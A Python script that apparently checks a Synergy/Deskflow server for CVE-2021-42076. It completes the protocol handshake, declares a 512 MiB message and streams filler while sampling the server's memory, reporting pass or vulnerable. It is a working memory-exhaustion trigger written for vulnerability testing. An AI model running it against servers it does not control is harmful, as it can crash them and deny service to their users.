#!/usr/bin/env python3
"""
CVE-2021-42076 - memory exhaustion from over-long TCP messages.

Synergy frames every protocol message with a four byte big-endian length.
Before 1.18.0 that length was taken at face value and the receiver buffered
whatever arrived until the declared amount had been collected, so an
unauthenticated peer could declare an enormous message and stream into it until
the process ran out of memory. Both the server and the client parse frames the
same way, so both were affected.

PacketStreamFilter::readPacketSize now rejects any declared size above
PROTOCOL_MAX_MESSAGE_LENGTH (4 MiB) by raising a stream format error, which
drops the connection before a single byte of the body is buffered.

This declares a message far larger than that cap and streams into it while
sampling the server's resident memory:

  connection dropped at once and memory flat   the cap is rejecting the frame
  bytes accepted and memory climbing           the declared size is being
                                               believed, which is the bug
  dropped before the protocol starts           an unverified peer cannot reach
                                               the parser, so it also passes

Memory is the signal rather than a disconnect, because a patched server and a
server that simply hung up for an unrelated reason look identical on the socket.

A server that refuses an unverified peer passes, because the attacker in this
advisory is unauthenticated and never reaches the parser. That run does not
exercise the length cap itself, so it says so; pass --cert and --key for a
certificate the target trusts to test the cap directly.

Exit codes: 1 VULNERABLE, 0 PASS. 2 means the check could not be run at all.
"""

import argparse
import os
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import time

HELLO_NAMES = (b"Synergy", b"Barrier")
MIB = 1024 * 1024

# Resident memory drifts while a server runs, so require growth to be a real
# fraction of what was streamed rather than any increase at all.
NOISE_ALLOWANCE_MIB = 16
LEAK_FRACTION = 0.25


def make_throwaway_cert(directory):
    cert = os.path.join(directory, "poc.crt")
    key = os.path.join(directory, "poc.key")
    subprocess.run(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "1",
         "-keyout", key, "-out", cert, "-subj", "/CN=synergy-poc"],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    return cert, key


def find_server_pid():
    found = []
    for entry in os.listdir("/proc"):
        if not entry.isdigit():
            continue
        try:
            with open(f"/proc/{entry}/comm", encoding="utf-8") as fh:
                if fh.read().strip() in ("deskflow-core", "synergy-core"):
                    found.append(int(entry))
        except OSError:
            continue
    return found


def read_rss_bytes(pid):
    try:
        with open(f"/proc/{pid}/status", encoding="utf-8") as fh:
            for line in fh:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1]) * 1024
    except (OSError, ValueError, IndexError):
        return None
    return None


def recv_packet(sock):
    header = sock.recv(4)
    if len(header) < 4:
        return None
    size = struct.unpack(">I", header)[0]
    if size == 0 or size > 65536:
        return None
    body = b""
    while len(body) < size:
        chunk = sock.recv(size - len(body))
        if not chunk:
            break
        body += chunk
    return body


def stream_oversized(host, port, cert, key, name, declared, volume, timeout, pid):
    """
    Returns (outcome, bytes_accepted, peak_rss). Outcome is opened, blocked,
    nohello or refused.

    Resident memory is sampled while the connection is still open. The receive
    buffer is released as soon as the peer goes away, so a sample taken after
    closing shows a patched server and a buffering one as equally flat.

    The oversized frame has to come after the handshake. ClientProxyUnknown caps
    the hello reply at kMaxHelloLength (1024 bytes) and drops anything longer, so
    sending it as the first message tests that guard instead of the frame length
    cap this advisory is about.
    """
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(cert, key)

    try:
        sock = ctx.wrap_socket(socket.create_connection((host, port), timeout=timeout))
    except (OSError, ssl.SSLError):
        return "blocked", 0, None

    accepted = 0
    peak = None
    outcome = "nohello"
    sock.settimeout(timeout)
    try:
        hello = recv_packet(sock)
        if hello is None:
            # tls completed but the server hung up without greeting us, which is
            # what the fingerprint check looks like from out here.
            return "blocked", 0, None
        if not hello.startswith(HELLO_NAMES):
            return "nohello", 0, None

        encoded = name.encode()
        body = hello[:7] + struct.pack(">hh", 1, 8) + struct.pack(">I", len(encoded)) + encoded
        sock.sendall(struct.pack(">I", len(body)) + body)

        adopted = False
        for _ in range(8):
            packet = recv_packet(sock)
            if packet is None:
                break
            code = packet[:4]
            if code in (b"EUNK", b"EBSY"):
                outcome = "refused"
                break
            if code == b"QINF":
                info = b"DINF" + struct.pack(">7h", 0, 0, 1920, 1080, 0, 960, 540)
                sock.sendall(struct.pack(">I", len(info)) + info)
            if code in (b"CALV", b"DSOP"):
                adopted = True
                break

        if adopted:
            outcome = "opened"
            print(f"[*] joined the session as {name!r}, declaring a {declared // MIB} MiB message")
            try:
                sock.sendall(struct.pack(">I", declared))
                chunk = b"A" * MIB
                while accepted < volume:
                    sock.sendall(chunk)
                    accepted += len(chunk)
                    if accepted % (16 * MIB) == 0:
                        print(f"    streamed {accepted // MIB} MiB")
            except (OSError, ssl.SSLError):
                # A patched server drops us on the declared size alone, so the
                # first write fails. That is the pass case, not an error.
                pass
            time.sleep(1.5)
            peak = read_rss_bytes(pid) if pid else None
        elif outcome != "refused":
            outcome = "refused"
    except (OSError, ssl.SSLError):
        pass
    finally:
        sock.close()

    return outcome, accepted, peak


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--declared-mib", type=int, default=512,
                    help="size to declare in the frame header, well above the 4 MiB cap")
    ap.add_argument("--stream-mib", type=int, default=128, help="how much to actually send")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--name", default="Unnamed",
                    help="screen name to join as; must be configured and free on the target")
    ap.add_argument("--server-pid", type=int, default=None,
                    help="pid of the local server to sample; auto-detected if omitted")
    ap.add_argument("--cert", help="client certificate to offer (default: generate a throwaway)")
    ap.add_argument("--key", help="private key for --cert")
    args = ap.parse_args()

    print("CVE-2021-42076 - memory exhaustion via an over-long message")
    print(f"target: {args.host}:{args.port}\n")

    if bool(args.cert) != bool(args.key):
        print("[ERROR] --cert and --key must be given together")
        return 2

    pid = args.server_pid
    if pid is None:
        found = find_server_pid()
        if len(found) == 1:
            pid = found[0]
        elif len(found) > 1:
            print(f"[warn] several server processes {found}, pass --server-pid to pick one")

    before = read_rss_bytes(pid) if pid else None
    if before is None:
        print("[*] no local memory sample available, running blind")
    else:
        print(f"[*] sampling pid {pid}, resident {before // MIB} MiB")

    tmp = None
    if args.cert:
        cert, key = args.cert, args.key
    else:
        tmp = tempfile.TemporaryDirectory()
        try:
            cert, key = make_throwaway_cert(tmp.name)
        except (OSError, subprocess.CalledProcessError) as exc:
            print(f"[ERROR] could not generate a certificate with openssl: {exc}")
            return 2

    try:
        outcome, accepted, peak = stream_oversized(
            args.host, args.port, cert, key, args.name,
            args.declared_mib * MIB, args.stream_mib * MIB, args.timeout, pid,
        )
    finally:
        if tmp:
            tmp.cleanup()

    if outcome == "blocked":
        print("[PASS] server dropped us before the protocol started, so an unverified")
        print("       peer cannot reach the message parser at all")
        print("       note this did not exercise the length cap itself. to check that,")
        print("       re-run with --cert and --key for a certificate the target trusts")
        return 0

    if outcome == "nohello":
        print("[ERROR] no protocol hello, cannot judge")
        return 2

    if outcome == "refused":
        print(f"[ERROR] the server would not admit a client named {args.name!r}, so the")
        print("        oversized frame was never sent. pass --name with a screen name")
        print("        that is configured on the target and not already connected")
        return 2

    print(f"[*] server accepted {accepted // MIB} MiB before the connection ended")

    if before is None:
        print("[ERROR] without a memory sample this cannot tell a rejected frame from")
        print("        a buffered one. re-run against a local server.")
        return 2

    if peak is None:
        if read_rss_bytes(pid) is None:
            print("[FAIL] server process is gone, it ran out of memory - VULNERABLE (CVE-2021-42076)")
            return 1
        print("[ERROR] no sample was taken while the connection was open")
        return 2

    growth = peak - before
    threshold = max(NOISE_ALLOWANCE_MIB * MIB, int(accepted * LEAK_FRACTION))
    print(f"[*] resident: {before // MIB} -> {peak // MIB} MiB "
          f"(growth {growth // MIB} MiB, threshold {threshold // MIB} MiB)")

    if growth >= threshold:
        print(f"[FAIL] server buffered the oversized message - VULNERABLE (CVE-2021-42076)")
        return 1

    print("[PASS] memory stayed flat, the declared size was rejected")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
